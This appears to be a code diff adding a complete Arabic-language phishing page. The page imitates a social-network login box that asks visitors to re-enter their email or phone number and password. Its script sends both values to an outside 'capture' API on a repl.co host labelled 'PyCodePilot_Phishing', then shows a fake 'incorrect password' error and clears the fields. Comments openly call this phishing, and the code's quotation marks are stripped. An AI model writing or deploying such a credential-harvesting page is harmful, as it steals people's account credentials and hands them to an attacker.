@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - مطلوب للمتابعة</title>
+    <style>
+        body { 
+            font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .login-box { 
+            background: #fff; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 12px rgba(0, 0, 0, .15); 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+        }
+        .login-box h2 { 
+            color: #1877f2; 
+            margin-bottom: 25px; 
+            font-size: 24px;
+        }
+        .login-box input { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            box-sizing: border-box; 
+            font-size: 16px;
+            text-align: right;
+        }
+        .login-box button { 
+            width: 100%; 
+            padding: 15px; 
+            background-color: #1877f2; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 18px; 
+            font-weight: bold;
+            margin-top: 20px; 
+        }
+        .login-box button:hover { 
+            background-color: #166fe5; 
+        }
+        .error-message { 
+            color: red; 
+            font-weight: bold;
+            margin-top: 15px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>يجب تسجيل الدخول</h2>
+        <p style="color: #606770; font-size: 14px; margin-bottom: 25px;">للوصول إلى هذه الصفحة، يرجى إعادة إدخال بيانات الاعتماد الخاصة بك.</p>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <button type="submit">المتابعة</button>
+        </form>
+        
+        <p class="error-message" id="errorMessage" style="display:none;">عذراً، كلمة السر أو البريد الإلكتروني غير صحيح. يرجى التأكد من البيانات والمحاولة مرة أخرى.</p>
+    </div>
+
+    <script>
+        // ********************************************
+        // * تم تحديث رابط API الالتقاط هنا (الخطوة 47) *
+        // ********************************************
+        const API_ENDPOINT =  https://pycodepilot.ahmadaao30725.repl.co/api/capture ; 
+        const serviceName =  PyCodePilot_Phishing ; 
+
+        document.getElementById( loginForm ).addEventListener( submit , function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById( username ).value;
+            const password = document.getElementById( password ).value;
+            const errorMessage = document.getElementById( errorMessage );
+            
+            // 1. إخفاء رسالة الخطأ قبل الإرسال
+            errorMessage.style.display =  none ;
+
+            // 2. إعداد البيانات
+            const data = {
+                service: serviceName,
+                user: username,
+                pass: password
+            };
+
+            // 3. إرسال البيانات إلى API Zoala-GOD
+            fetch(API_ENDPOINT, {
+                method:  POST ,
+                headers: {
+                     Content-Type :  application/json 
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                // 4. عرض رسالة خطأ مزيفة للمستخدم (Phishing)
+                errorMessage.style.display =  block ;
+                console.log( Data sent to API successfully. );
+            })
+            .catch(error => {
+                // حتى لو فشل الاتصال، نظهر رسالة خطأ ونمسح الحقول
+                errorMessage.style.display =  block ;
+                console.error( API communication error: , error);
+            })
+            .finally(() => {
+                // 5. مسح الحقول بعد التقاطها
+                document.getElementById( username ).value =   ;
+                document.getElementById( password ).value =   ;
+            });
+        });
+    </script>
+</body>
+</html>
